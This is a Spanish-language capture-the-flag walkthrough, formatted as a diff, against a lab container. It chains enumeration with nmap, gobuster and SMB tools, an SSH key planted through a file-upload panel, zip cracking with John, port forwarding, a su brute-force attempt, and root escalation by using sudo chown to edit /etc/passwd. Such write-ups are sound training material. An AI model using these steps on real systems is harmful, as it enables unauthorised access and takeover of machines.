@@ -1,0 +1,227 @@
+# Enumeracion de Puertos, Servicios y Versiones
+nmap -Pn -n -sS -p- -sV --script 'vuln' --min-rate 5000 -vvv 172.18.0.2 -oN nmap
+
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+
+comenzamos chequeando el servicio web por el puerto 80 y nos conseguimos con un panel que nos permite
+cargar un archivo, antes de intentar subir cualquier archivo haremos fuzzing
+
+
+# Fuzzing Web
+
+gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -x php,txt,html,py,js,png,jpg -b 403,404
+
+===============================================================
+/index.html           (Status: 200) [Size: 2410]
+/upload.php           (Status: 200) [Size: 56]
+/readme.txt           (Status: 200) [Size: 78]
+Progress: 1661144 / 1661152 (100.00%)
+===============================================================
+
+leeremos la informacion del readme.txt
+
+curl http://172.18.0.2//readme.txt
+
+===============================================================================
+It may be that the file that is being uploaded is being uploaded in a .ssh/?
+traducimos:
+Puede ser que el archivo que se está subiendo esté subiendo en un .ssh/?
+===============================================================================
+
+parece que el archivo que podemos subir por el panel en el servicio web del puerto 80
+se alojara en .ssh, lo que no tenemos es conocimiento de en cual usuario del sistema
+se cargaria el archivo, asi que seguiremos investigando y ahora veremos si podemos 
+dumpear usuarios de smb
+
+rpcclient -U '' -N 172.18.0.2
+rpcclient $> enumdomusers			| dumpeamos los usuario del servicio smb
+user:[sambauser] rid:[0x3e8]			| usuario conseguido: sambauser
+
+intentamos enumerar recursos compartidos pero solicita clave, le hago un ataque de diccionario
+y no consigo su clave
+
+================================================================================
+
+enum4linux 172.18.0.2
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 Unix User\root-false (Local User)
+S-1-22-1-1001 Unix User\sambauser (Local User)
+S-1-22-1-1002 Unix User\less (Local User)
+S-1-22-1-1003 Unix User\passsamba (Local User)
+
+aqui conseguimos enumerar usuarios del sistema, entonces ahora crearemos un par de claves ssh
+para cargarlas por el portal web y despues intentar conectarnos a alguno de los usuarios 
+encontrados
+
+ssh-keygen -t rsa -b 4096
+cp /home/darks/.ssh/id_rsa .
+cp /home/darks/.ssh/id_rsa.pub .
+cp id_rsa.pub authorized_keys
+chmod go-rxw id_rsa
+
+
+ahora cargamos por el portal web del puerto 80 los archivos:
+authorized_keys
+id_rsa.pub
+
+ya cargado los archivos comenzamos a probar con cada usuario la conexion via ssh
+pudimos acceder con el usuario passsamba
+
+ssh -i id_rsa passsamba@172.18.0.2
+passsamba@0f1f486a80d3:~$ 
+
+# Escalada
+
+sudo -l					| solicita clave
+find / -perm -4000 2>/dev/null		| nada por aqui
+ls
+note.txt
+cat note.txt
+What would "sambaarribasiempre" be used for?
+
+parece ser una clave, probare si es del usuario actual
+
+sudo -l
+pass: sambaarribasiempre
+
+y no es de este usuario, asi que despues de probar contra los demas usuarios resulto ser del 
+usuario sambauser, asi que ya cambiamos de usuario
+
+sudo -l					| no podemos ejecutarlo
+find / -perm -4000 2>/dev/null          | nada por aqui
+===================================================================================================================================
+
+despues de revisar el sistema y los procesos no veo nada por alli, asi que ahora intento
+por recursos compartidos de smb desde mi maquina atacante
+
+smbmap -u 'sambauser' -p 'sambaarribasiempre' -H 172.18.0.2
+
+===================================================================================================================================
+[+] IP: 172.19.0.2:445	Name: 172.18.0.2			Status: Authenticated
+	Disk							Permissions	Comment
+	----							-----------	-------
+	print$							READ ONLY	Printer Drivers
+	read_only_share						READ ONLY	
+	IPC$							NO ACCESS	IPC Service (0f1f486a80d3 server (Samba, Ubuntu))
+[*] Closed 1 connections
+====================================================================================================================================
+
+smbmap -u 'sambauser' -p 'sambaarribasiempre' -H 172.19.0.2 -r read_only_share
+
+====================================================================================================================================
+[+] IP: 172.19.0.2:445	Name: 172.18.0.2			Status: Authenticated
+	Disk							Permissions	Comment
+	----							-----------	-------
+	print$							READ ONLY	Printer Drivers
+	read_only_share						READ ONLY	
+	./read_only_share
+	dr--r--r--                0 Tue Aug 27 05:21:21 2024	.
+	dr--r--r--                0 Tue Aug 27 05:21:21 2024	..
+	fr--r--r--              242 Tue Aug 27 05:21:13 2024	secret.zip
+	IPC$							NO ACCESS	IPC Service (0f1f486a80d3 server (Samba, Ubuntu))
+[*] Closed 1 connections         
+=====================================================================================================================================
+
+aqui vemos un archivo .zip el cual nos vamos a descargar
+
+smbclient //172.18.0.2/read_only_share -U sambauser%sambaarribasiempre -c 'get secret.zip'
+
+getting file \secret.zip of size 242 as secret.zip (236.3 KiloBytes/sec) (average 236.3 KiloBytes/sec)
+
+7z x secret.zip											| solicita clave asi que lo crackearemos o por lo menos intentarlo
+zip2john secret.zip > hashzip									| extraemos el hash y lo aguardamos en hashzip
+john --wordlist=/home/darks/Desktop/Kali/diccionarios/rockyou.txt hashzip			| intentamos crackear el hash
+
+qwert            (secret.zip/secret.txt)
+
+7z x secret.zip
+pass: qwert
+
+se descomprimio un .txt que al leerlo contiene lo que parece ser las credenciales del usuario root-false, pero
+la clave parece estar codificada en base64
+
+root-false:cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==
+
+echo 'cGFzc3dvcmRiYWRzZWN1cmV1bHRyYQ==' |base64 -d						| decodificamos la clave
+passwordbadsecureultra
+
+ahora volvemos a sambauser e intentamos escalar a root-false
+
+su root-false
+pass: passwordbadsecureultra
+
+ahora somos el user root-false
+
+ls -l
+-rw-r--r-- 1 root root 85 Aug 27 14:27 message.txt
+cat message.txt
+===========================================================
+Mario, remember this word, then the boss will get angry:
+
+"pinguinodemarioelmejor"
+===========================================================
+
+quisas pueda ser una credencial asi que la pruebo contra el usuario less y root pero
+no pertenece a ninguno de los 2, revise el sistema, si encontraba SUID y nada, pero
+al chequear las interfaces de red nos conseguimos con lo siguiente:
+
+hostname -I
+
+172.18.0.2 10.10.11.5
+
+vemos que existen 2 interfaces de red
+
+curl 10.10.11.5
+
+{devuelve el codigo de una pagina web, asi que podemos deducir que esta corriendo por el puerto 80}
+
+ssh root-false@172.18.0.2 -L 1000:10.10.11.5:80		| haremos un forwarding para poder acceder a ese servicio web desde la maquina atacante
+
+Después de ejecutar este comando, podrías abrir un navegador web y navegar a http://localhost:1000 
+Esto redirigirá tu solicitud al servidor 10.10.11.5 en el puerto 80, permitiéndote acceder al servicio 
+web que se está ejecutando allí.
+
+al chequear http://localhost:1000 desde nuestra maquina atacante, vemos que es un panel de login, vamos a probar con mario:pinguinodemarioelmejor
+que esto lo conseguimos en el archivo message.txt, tuvimos acceso pero nada que nos sirva, asi que despues de revisar el codigo fuente nos 
+conseguimos con este comentario: <!--ultramegatextosecret.txt-->
+ 
+despues de mucho rato intentando varias cosas, accedi a http://localhost:1000/ultramegatextosecret.txt
+y es como una historio o un cuento de less (que es un usuario del sistema), creare ahora una wordlist
+con el contenido de esa historia para probar atacar por diccionario la passwd del usuario less..
+
+cewl http://localhost:1000/ultramegatextosecret.txt -w wordlist
+
+me envio la wordlist y un script para atacar passwd de usuarios del sistema
+
+scp Linux-Su-Force.sh root-false@172.18.0.2:/home/root-false/
+scp wordlist root-false@172.18.0.2:/home/root-false/
+
+tras probar, no obtuve resultados, asi que me dedique a leer el cuento y de todo el texto lo unico fuera de lo comun era: Cristal_de_la_Aurora
+asi que lo probe como passwd del usuario less
+
+su less
+passwd: Cristal_de_la_Aurora
+
+resulto ser la passwd del usuario less
+
+sudo -l
+    (ALL : ALL) NOPASSWD: /bin/chown
+
+ya esta escalada es muy sencilla, chown lo que hace es cambiar el propietario de un directorio o archivo y como podemos ejecutarlo como root
+vamos a cambiar de propietario el archivo /etc/passwd para despues poder editarlo
+
+sudo /bin/chown less /etc/passwd			|cambiamos de propietario, ya no es root, ahora es less
+ls -l /etc/passwd					|validamos
+-rw-r--r-- 1 less root 1382 Aug 27 13:36 /etc/passwd
+nano /etc/passwd					| entramos a editar el archivo
+root::0:0:root:/root:/bin/bash				| dejamos la linea de root asi (eliminando la x)
+
+guardamos cambios y salimos
+su root
+whoami
+#root
